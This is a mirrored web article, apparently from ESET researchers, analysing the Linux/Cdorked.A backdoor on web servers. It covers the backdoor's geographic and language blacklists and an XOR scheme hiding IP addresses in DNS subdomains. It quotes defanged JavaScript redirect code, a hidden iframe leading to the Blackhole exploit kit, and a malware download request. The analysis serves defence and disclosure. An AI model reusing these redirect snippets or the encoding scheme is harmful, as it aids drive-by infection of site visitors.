<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Linux / Cdorked.A: Web servers running Lighttpd and nginx at risk</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In the last part of our study, we promised to publish a continuation of the analysis of the incident of Linux server infections involving the Linux / ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Linux / Cdorked.A: Web servers running Lighttpd and nginx at risk</h1><div class="post__text post__text-html js-mediator-article">  In the last part of our study, we promised to publish a continuation of the analysis of the incident of Linux server infections involving the <b>Linux / Cdorked.A backdoor</b> .  We already <a href="http://habrahabr.ru/company/eset/blog/178197/">wrote</a> that our laboratory specialists established its main task, which is to redirect web server users to malicious websites.  Investigating in more detail this incident, we came to the following conclusions: <br><br><ul><li>  In total, more than 400 web servers infected with Linux / Cdorked.A were detected.  In addition, 50 of them provide hosting for websites that are in the Alexa TOP 100,000 most popular websites. </li><li>  The backdoor compromised web servers, not only running Apache, but also Lighttpd, as well as nginx. </li><li>  According to our telemetry systems, this threat has been active since December 2012. </li><li>  The backdoor uses additional mechanisms to ensure its secrecy.  In particular, we have established that the malicious code will not redirect users if the client‚Äôs IP address is in the range of addresses listed on the blacklist.  This blacklist is quite large and includes addresses belonging to countries such as Japan, Finland, Russia, Ukraine, Kazakhstan and Belarus.  In addition, country verification is also performed by analyzing the HTTP header and the Accept-Language parameter. </li><li>  Our cloud technology features almost 100,000 users of ESET AV products, which are redirected to links generated by compromised web servers.  At the same time, such redirection to malicious content was blocked by the antivirus. </li><li>  In some cases, we observed special redirects for Apple iPad and iPhone platforms. </li></ul><br><br><a name="habracut"></a><img src="https://habrastorage.org/storage2/677/508/ec6/677508ec64fc7cb07d463e72f4afd17f.jpg">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      In this post, we want to dwell in more detail on the capabilities of this backdoor, which were identified during the analysis, as well as describe in more detail the malicious content delivered to users and the organization of redirecting the user to a set of exploits. <br><br>  It should be noted that we do not know for sure how the backdoor got on the servers.  Perhaps the vector of this attack was not unique.  At the same time, we cannot say that a gap was used in its settings in cPanel settings, since not all compromised servers were under its control.  The backdoor has no self-propagation mechanisms and does not use a vulnerability in the software on the server for its installation. <br><br>  The following screenshots show the places in the backdoor code where remote access to the server is opened.  Different types of binary files replacing legal Lighttpd, nginx and Apache files. <br><br><img src="https://habrastorage.org/storage2/b9d/606/ecf/b9d606ecfcffe707e7b478722dfd0625.png"><br>  <b>Lighttpd</b> <br><br><img src="https://habrastorage.org/storage2/7a4/82b/557/7a482b5577236b8b41a9fd22a59b40e5.png"><br>  <b>nginx</b> <br><br><img src="https://habrastorage.org/storage2/296/484/ee8/296484ee879c96e90624c4da8221c4cd.png"><br>  <b>Apache</b> <br><br>  The backdoor code looks identical in all three variants, but the hooks used inside some functions are different, because they depend on the selected server and its data structures. <br><br>  <b>Backdoor features</b> <br><br>  We have already mentioned the commands supported by backdoor.  In this analysis we will focus on them in more detail. <br><br><img src="https://habrastorage.org/storage2/490/c8c/d61/490c8cd61c4f238bce635677b6414d8d.png"><br><br>  These lists are stored in a shared memory area, which can be accessed using our analysis tool.  The settings listed in the table really give attackers an excellent opportunity to fine-tune their malicious code when selecting targets for an attack.  Linux / Cdorked.A stores a list of IP addresses of already redirected clients with the time of redirection.  This avoids repeated redirections within a specified period of time.  None of these settings are stored in a file on disk and each of them is modified via special HTTP requests processed by the backdoor. <br><br>  <b>Typical backdoor configuration</b> <br><br>  With the help of system administrators who took part in investigating incidents of a web server compromise, as well as <a href="http://sucuri.net/">Sucuri</a> specialists, we were able to get dumps of memory regions in which Linux / Cdorked.A stores its configuration information.  An example of one of these dumps: <br><br><img src="https://habrastorage.org/storage2/b9e/bc3/47f/b9ebc347f09fb2bd858d450c582f9d89.png"><br><br>  So far, we have not been able to get any Linux / Cdorked.A configuration that would contain more than one URL used to redirect clients.  The specified redirect is applied to clients that make requests to the server, working under Internet Explorer or Firefox browsers on Windows XP, Vista, Seven.  Apple iPhone and iPad users also came under fire, however, instead of redirecting to a set of exploits, they were redirected to a web page with links to pornographic websites.  The following screenshot shows a redirect to the iPhone. <br><br><img src="https://habrastorage.org/storage2/abe/4ce/275/abe4ce275b184c2269b8d08dd9f1cd7d.png"><br><br>  We already mentioned that the Linux / Cdorked.A configuration includes an extensive blacklist of IP ranges.  Visitors to a compromised web server coming from one of these addresses will never be redirected to malicious content.  In fact, in the backdoor configurations that we observed, the number of IP addresses, which represents 50% of all possible IP v4 space addresses, was blocked.  The client is also not redirected if the language set in the Accept-Language field of the browser's HTTP header is blacklisted.  The following languages ‚Äã‚Äãare listed: <br><br><ul><li>  ja, jp - Japanese; </li><li>  fi - Finnish; </li><li>  ru - Russian; </li><li>  uk - Ukrainian; </li><li>  be - Belarusian; </li><li>  kk - Kazakh; </li></ul><br>  In fact, the attackers specifically limited the geography of the backdoor distribution, since the uncontrolled infection of users could adversely affect the maintenance of already compromised servers and the induction of unnecessary suspicions. <br><br>  <b>Redirection statistics</b> <br><br>  In fact, these malicious redirects have something in common: in the case of Blackhole, when redirecting clients, the ‚Äú/ info / last‚Äù part is indicated in the URL pattern.  In the earliest traces of malicious activity that we traced, it is the template that contains the ‚Äú/ info / last‚Äù part, using identical DNS templates, which will be described later. <br><br>  After analyzing the traffic, we discovered more than 400 web servers that were affected by Linux / Cdorked.A activities.  Moreover, 50 of them provide hosting for websites that are included in the Alexa TOP 100,000 most popular websites.  After the publication of the first part of our analysis, some owners of these servers cleaned the servers of this threat. <br><br><img src="https://habrastorage.org/storage2/ce3/d04/4c8/ce3d044c83d879e1b216bad192a73971.png"><br><br>  Linux / Cdorked.A supports the timestamps of the last redirection case for each IP address.  We were able to extract this information from the memory dump in order to estimate how many redirects one server can do during the day.  One of these dumps contained information about the server, which carried out more than 28,000 redirects in 24 hours.  Such servers are not active all the time; below is the statistics on redirections for several servers. <br><br><img src="https://habrastorage.org/storage2/973/277/296/973277296afaab0f521d3a540c63e7be.png"><br><br><img src="https://habrastorage.org/storage2/46f/b5f/7e6/46fb5f7e6521e29467d969a74873bc92.png"><br><br>  <b>DNS Hijacking</b> <br><br>  The URLs of the URL servers used by the backdoor for redirections often change.  However, there are several patterns: <br><br><ul><li>  Usually, the domain path is: [numbers, a, b, or c] [characters]. [Tld]. </li><li>  The domain of the next level is always 16 hex characters long. </li></ul><br>  The specific format of the subdomains and the fact that they are constantly changing gives us reason to believe that some DNS servers have been compromised.  We conducted several tests in which we ourselves modified the characters of the subdomains and in some cases obtained a change in the IP address during its translation.  With some other tests, we were able to confirm the fact that the IP address returned via the DNS service is, in fact, encoded in the name of the subdomain itself.  To do this, use characters in odd positions that form a 4-byte hex-string, then used to obtain the IP address.  The XOR algorithm is used to generate an IP address: <br><br><img src="https://habrastorage.org/storage2/8c2/2e5/2b5/8c22e52b55f29f6383cf3f45ad5d16c9.png"><br><br>  For this, an algorithm is used. <br><br> <code>byte[] = { 16, 70, 183, 11 } // From the hex string <br> seed = 49 // This seed changes, we have not yet found where it comes for <br> ip[0] = seed ^ byte[0] // 33 <br> ip[1] = byte[0] ^ byte[1] // 86 <br> ip[2] = byte[1] ^ byte[2] // 241 <br> ip[3] = byte[2] ^ byte[3] // 188 <br> // This gives us a response with IP 188.241.86.33</code> <br> <br>  <b>Redirection chain</b> <br><br>  If a client is redirected to malicious content, he goes through several special web pages before being directly on the Blackhole exploit kit page.  The following screenshot shows an example of such a chain. <br><br><img src="https://habrastorage.org/storage2/7cf/263/f84/7cf263f84d6279d845376ffb699e22e2.png"><br><br>  The first page /index.php contains a parameter that is encrypted using base64 and was documented in our previous article.  After decoding, it looks like this. <br><br>  <i>ljroujxv = isiuzv &amp; time = 1305022208-2007115935 &amp; src = 141 &amp; surl = somedomain.com &amp; sport = 80 &amp; key = ED143377 &amp; suri = / tr / zeki.htm.</i> <br><br>  This page contains javascript that redirects the user to the next page. <br><br> <code>var iflag = "0"; if (top!=self) { iflag = "1"; }; <br> var b64str = "MTQxNDExMzA1MDIyMjQ4M...luLmNvbS9zb3J0LnBocA=="; <br> setTimeout ( function() { location.replace( "hxxp://ae334b05c4249f38" + iflag <br> + b64dec(b64str) ); }, 280); <br></code> <br><br>  The second page URL consists of three parts: the initial subdomain, the value of the iflag parameter, and the value of the b64str variable generated by the server.  The value of the iflag parameter is set to 1 if the current document is located in the foreground browser window.  In this case, the server is likely to reject the request.  The value of the b64str variable is provided by the server and contains a URL with a very long part of the subdomain. <br><br>  <i>1414113050222483098587bcf02fc1731aade45f74550b.somedomain.com/sort.php</i> <br><br>  The third part of the URL contains specific information about this redirect, such as the source ID ‚Äî src id, obtained from the start URL and the timestamp.  The purpose of the remaining characters remains unknown. <br><br><img src="https://habrastorage.org/storage2/46b/e76/3e7/46be763e7cd80e0d58a454cc57fba47a.png"><br><br>  The third page, sort.php, after a certain timeout, directs the user to the fourth page, exit.php.  A typical sort.php page looks like this. <br><br> <code>function gotime() { xflag=false; top.location.replace(b64dec("aHR0cDovL2FlMzM0YjA1YzQyNDlmM... <br> ...cD94PTEzNyZ0PXRpbWVvdXQ=")); }; <br> var timer=setTimeout("gotime()", 21000); <br> var ewq; <br> ewq=document.createElement("span"); <br> ewq.innerHTML=b64dec("PGlmcmFtZSBzcmM9Im...1lPjxicj4="); <br> setTimeout(function() { document.body.insertBefore(ewq,document.body.lastChild); }, 504); <br> aHr...XQ= : hxxp://ae334b05c4249f38014141130... <br> ...50222483098587bcf02fc1731aade45f74550b.somedomain.com/exit.php?x=137&amp;t=timeout</code> <br> <br>  This fourth page shows pornographic images and contains links to pornographic websites.  The page also contains an iframe that leads to the Blackhole page.  While it is unclear whether links to porn content are malicious or are part of an affiliate program.  Below is an iframe leading to the landing page Blackhole. <br><br> <code>PGI...j4= : &lt;iframe src="hxxp://ae334b05c4249f38014141130502224830... <br> ...98587bcf02fc1731aade45f74550b.somedomain.com/info/last/index.php" <br> width="120" height="21" marginwidth="0" marginheight="0" frameborder="0" <br> scrolling="no" allowtransparency="true"&gt;</code>  <code>PGI...j4= : &lt;iframe src="hxxp://ae334b05c4249f38014141130502224830... <br> ...98587bcf02fc1731aade45f74550b.somedomain.com/info/last/index.php" <br> width="120" height="21" marginwidth="0" marginheight="0" frameborder="0" <br> scrolling="no" allowtransparency="true"&gt;</code> &lt;br&gt; <br><br>  The final step is to download the malware onto the victim‚Äôs computer if one of the exploits successfully worked. <br><br>  <i>GET /get3.php?e=176541242&amp;tc=1305022250-072800c977&amp;uid=5362013050321195916567777 HTTP / 1.0</i> <i><br></i>  <i>Host: ae334b05c4249f38.somedomain.com</i> <i><br></i>  <i>User-Agent: NSISDL / 1.2 (Mozilla)</i> <i><br></i>  <i>Accept: * / *</i> <br><br>  Our tests and telemetry data show that a <a href="http://habrahabr.ru/company/eset/blog/115439/">Win32 / Glupteba.G</a> Trojan program was installed on users' computers. <br><br>  <b>Recovery</b> <br><br>  In the last post, we recommended that system administrators check the integrity of the main binary files stored on the server.  We also published the <a href="">dump_cdorked_config</a> tool to dump a region of memory that stores the Linux / Cdorked.A configuration.  This tool has been updated to detect all backdoor options, including versions for nginx and Lighttpd. <br><br>  For network users, we recommend timely updating the browser, its extensions, OS, as well as critical software such as Java, Adobe Reader and Flash Player.  Using antivirus is also a good practice. </div><p>Source: <a href="https://habr.com/ru/post/179115/">https://habr.com/ru/post/179115/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../179091/index.html">Are you still using Google Reader?</a></li>
<li><a href="../179095/index.html">Terms, jargon, and definitions of Android</a></li>
<li><a href="../179101/index.html">Mobile conference # MBLT13 in a week!</a></li>
<li><a href="../179105/index.html">Runetology (197): Kirill Grodinsky, CEO, E5.ru</a></li>
<li><a href="../179109/index.html">Moving a cat in time and space</a></li>
<li><a href="../179119/index.html">The evolution of SVP. Directions free</a></li>
<li><a href="../179123/index.html">What is dangerous rebase, or how it happened that 2 * 3 = 5</a></li>
<li><a href="../179131/index.html">How in the application to get a list of files transferred from Explorer using Drag-and-Drop</a></li>
<li><a href="../179135/index.html">India launches tracking system for all calls, SMS and Internet activity</a></li>
<li><a href="../179141/index.html">Why is the work not an apartment?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>